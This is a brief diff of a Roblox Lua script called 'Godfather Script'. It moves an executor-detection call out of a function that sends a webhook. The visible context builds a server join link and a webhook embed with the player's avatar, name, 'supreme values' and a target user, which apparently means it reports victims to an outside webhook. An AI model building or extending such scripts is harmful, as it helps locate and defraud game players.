@@ -46,7 +46,7 @@ local fernJoinerLink = string.format(
     PlaceId, 
     JobId
 )
-
+local execRequest, executorName = findRequest()
 
 local function GodfatherScriptFetchSupremeValues()
     local values = {}
@@ -175,7 +175,7 @@ end
 local function GodfatherScriptSendWebhook()
     local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
     local targetName = users[1]
-	local execRequest, executorName = findRequest()
+
     
     local embed = {
         title = string.format("Godfather Script | %s | %s", plr.DisplayName, targetName),
